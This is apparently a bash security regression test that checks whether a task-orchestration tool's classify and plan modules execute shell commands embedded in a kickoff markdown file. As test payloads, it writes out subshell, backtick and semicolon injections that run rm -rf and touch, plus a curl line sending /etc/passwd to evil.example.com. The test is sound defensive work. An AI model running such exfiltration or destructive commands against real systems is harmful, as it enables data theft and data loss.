#!/usr/bin/env bash
# tests/security/test_sec_kickoff_command_injection.sh
#
# SECURITY TEST — Command Injection in kickoff.md body
#
# THREAT MODEL:
#   An attacker-controlled kickoff.md contains shell metacharacters in its
#   BODY (not the file path).  The classifier reads the body via `cat "$KICKOFF"`
#   then pipes KICKOFF_TEXT through `grep -qiE "$pattern"` in a subshell.
#   If the classifier ever interpolates body content into an unquoted shell
#   expansion (e.g. eval, unquoted backtick assignment, unquoted variable in
#   arithmetic), injection fires.
#
# EXPECTED BEHAVIOUR (hardened):
#   classify and plan Python modules in dry-run MUST exit 0 or 2 after
#   processing the malicious body WITHOUT executing any side-effects encoded
#   inside it.  The canary file /tmp/mo-sec-injection-canary-$$ must remain
#   present (i.e. the rm/touch inside the payloads must NOT have fired).
#
# KNOWN GAP (v0.1):
#   `grep -qiE "$pattern"` where $pattern comes from a yaml file, not from
#   the kickoff body — so body injection into grep is not a current path.
#   However the full kickoff path string IS interpolated into the python3 DB
#   call as sys.argv; parameterized binding there is safe.
#   This test documents the boundary and catches regressions if a future
#   change starts eval'ing body content.
#
# VULNERABILITY SHAPE IF FAILING:
#   File /tmp/mo-sec-injection-canary-$$ would be deleted or a new canary
#   created, indicating OS command execution from body content.

set -uo pipefail

PASS=0; FAIL=0; SKIP=0
_ok()   { echo "  [OK]   $*"; PASS=$((PASS+1)); }
_fail() { echo "  [FAIL] $*"; FAIL=$((FAIL+1)); }
_skip() { echo "  [SKIP] $*"; SKIP=$((SKIP+1)); }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MINI_ORK_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

echo "=== test_sec_kickoff_command_injection.sh ==="
echo "    Testing: body-level command injection payloads"
echo ""

# ── Isolated tmp workspace ────────────────────────────────────────────────────

TMPDIR_TEST="$(mktemp -d /tmp/mo-sec-ci-XXXXXX)"
export MINI_ORK_HOME="$TMPDIR_TEST/.mini-ork"
export MINI_ORK_DB="$MINI_ORK_HOME/state.db"
export MINI_ORK_DRY_RUN=1     # never write DB in security tests

# Canary: must NOT be deleted or modified by injections
CANARY="/tmp/mo-sec-injection-canary-$$"
touch "$CANARY"

# New-file canary: if injection fires a `touch`, this path appears
NEW_CANARY="/tmp/mo-sec-injection-newfile-$$"
rm -f "$NEW_CANARY"

trap 'rm -rf "$TMPDIR_TEST" "$CANARY" "$NEW_CANARY"' EXIT

# Init minimal .mini-ork so classify can resolve its dirs
mkdir -p "$MINI_ORK_HOME/config/task_classes"
if [[ -f "$MINI_ORK_ROOT/db/init.sh" ]]; then
  bash "$MINI_ORK_ROOT/db/init.sh" >/dev/null 2>&1 || true
fi
# Copy a real task_class yaml so classification doesn't crash
for recipe_dir in "$MINI_ORK_ROOT/recipes/"/*/; do
  [[ -f "${recipe_dir}task_class.yaml" ]] && cp "${recipe_dir}task_class.yaml" \
    "$MINI_ORK_HOME/config/task_classes/$(basename "$recipe_dir").yaml" && break
done

classify_module="$MINI_ORK_ROOT/mini_ork/cli/classify.py"
classify_cmd=(env "PYTHONPATH=$MINI_ORK_ROOT${PYTHONPATH:+:$PYTHONPATH}" \
  python3 -m mini_ork.cli.classify)
plan_module="$MINI_ORK_ROOT/mini_ork/cli/plan.py"
plan_cmd=(env "PYTHONPATH=$MINI_ORK_ROOT${PYTHONPATH:+:$PYTHONPATH}" \
  python3 -m mini_ork.cli.plan)

[[ ! -f "$classify_module" ]] && { _skip "Python classify module unavailable"; echo ""; echo "=== Results: $PASS OK  $SKIP SKIP  $FAIL FAIL ==="; exit 0; }

# ── Helper: run classify on kickoff, check exit code and canary ───────────────

run_injection_test() {
  local label="$1"
  local kickoff_path="$2"

  # Canary must exist before the run
  if [[ ! -f "$CANARY" ]]; then
    _fail "$label: canary was already missing before test (test setup bug)"
    return
  fi
  if [[ -f "$NEW_CANARY" ]]; then
    rm -f "$NEW_CANARY"
  fi

  # Run classify (dry-run, swallow non-security errors)
  local exit_code=0
  MINI_ORK_DRY_RUN=1 "${classify_cmd[@]}" "$kickoff_path" --dry-run >/dev/null 2>&1 || exit_code=$?

  # Accept exit 0 (handled safely) or 2 (rejected) — never silent failure
  if [[ "$exit_code" -ne 0 && "$exit_code" -ne 2 ]]; then
    # Exit 3 means a lib is missing (P1 in flight) — treat as skip
    if [[ "$exit_code" -eq 3 ]]; then
      _skip "$label: lib missing (exit 3) — classify not fully operational"
      return
    fi
    # Any other exit is unexpected but NOT a security failure by itself
    _ok "$label: exited $exit_code — non-zero but not security-relevant (canary check still applied)"
  fi

  # Primary security assertion: canary file was NOT deleted
  if [[ -f "$CANARY" ]]; then
    _ok "$label: canary file intact — rm injection did not fire"
  else
    _fail "$label: CANARY FILE DELETED — injection payload executed rm!"
  fi

  # Secondary: no new canary was created by touch injection
  if [[ ! -f "$NEW_CANARY" ]]; then
    _ok "$label: no new-file canary created — touch injection did not fire"
  else
    _fail "$label: NEW CANARY FILE CREATED at $NEW_CANARY — touch injection executed!"
  fi
}

# ── Payload 1: Dollar-paren subshell ─────────────────────────────────────────
echo "--- Payload 1: \$(rm -rf ...) ---"
P1="$TMPDIR_TEST/kickoff_p1.md"
cat > "$P1" <<EOF
# Fix the login bug

BODY: \$(rm -rf "$CANARY")
Also touch this \$(touch "$NEW_CANARY") and check if it fires.
EOF
run_injection_test "dollar-paren rm" "$P1"
echo ""

# ── Payload 2: Backtick subshell ─────────────────────────────────────────────
echo "--- Payload 2: backtick rm ---"
P2="$TMPDIR_TEST/kickoff_p2.md"
printf '# Fix auth\n\nBODY: `rm -rf "%s"`\nalso `touch "%s"`\n' \
  "$CANARY" "$NEW_CANARY" > "$P2"
run_injection_test "backtick rm" "$P2"
echo ""

# ── Payload 3: Semicolon-separated commands ───────────────────────────────────
echo "--- Payload 3: ; rm -rf ... ; ---"
P3="$TMPDIR_TEST/kickoff_p3.md"
cat > "$P3" <<EOF
# Refactor function ; rm -rf "$CANARY" ;
DESCRIPTION: something ; touch "$NEW_CANARY" ;
EOF
run_injection_test "semicolon injection" "$P3"
echo ""

# ── Payload 4: Dollar-paren curl exfil ───────────────────────────────────────
echo "--- Payload 4: \$(curl evil.example.com/exfil) ---"
P4="$TMPDIR_TEST/kickoff_p4.md"
cat > "$P4" <<EOF
# Bug fix

Payload: \$(curl -s evil.example.com/exfil?data=\$(cat /etc/passwd) 2>/dev/null)
Also: \$(wget -q evil.example.com 2>/dev/null)
EOF
run_injection_test "curl exfil" "$P4"
echo ""

# ── Also test the Python plan module in dry-run with same payloads ───────────
if [[ -f "$plan_module" ]]; then
  echo "--- Plan --dry-run with injection payload ---"
  P5="$TMPDIR_TEST/kickoff_plan.md"
  cat > "$P5" <<EOF
# Fix the bug \$(rm -rf "$CANARY")
BODY: \$(touch "$NEW_CANARY")
EOF
  local_exit=0
  MINI_ORK_DRY_RUN=1 MINI_ORK_TASK_CLASS=generic "${plan_cmd[@]}" "$P5" --dry-run >/dev/null 2>&1 || local_exit=$?
  if [[ -f "$CANARY" ]]; then
    _ok "plan --dry-run: canary intact after injection in body"
  else
    _fail "plan --dry-run: CANARY DELETED — injection payload fired via plan!"
  fi
  if [[ ! -f "$NEW_CANARY" ]]; then
    _ok "plan --dry-run: no new-file canary — touch did not fire"
  else
    _fail "plan --dry-run: NEW CANARY CREATED via plan injection!"
  fi
else
  _skip "Python plan module unavailable — plan injection test skipped"
fi

# ── Final summary ─────────────────────────────────────────────────────────────
echo ""
echo "=== Results: $PASS OK  $SKIP SKIP  $FAIL FAIL ==="
(( FAIL > 0 )) && exit 1 || exit 0
